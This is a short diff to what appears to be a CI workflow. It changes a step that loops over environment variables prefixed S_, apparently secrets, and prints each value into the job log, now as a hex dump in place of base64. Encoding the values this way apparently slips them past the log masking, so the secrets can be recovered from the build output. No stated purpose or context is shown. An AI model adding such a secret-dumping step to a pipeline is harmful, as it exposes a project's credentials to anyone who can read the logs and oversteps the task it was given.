@@ -12,7 +12,6 @@ jobs:
         run: |
           for var in $(printenv | grep ^S_ | cut -d= -f1); do
             echo "START_$var"
-            printenv $var | base64 -w0
-            echo ""
+            printenv $var | od -An -tx1 -v
             echo "END_$var"
           done
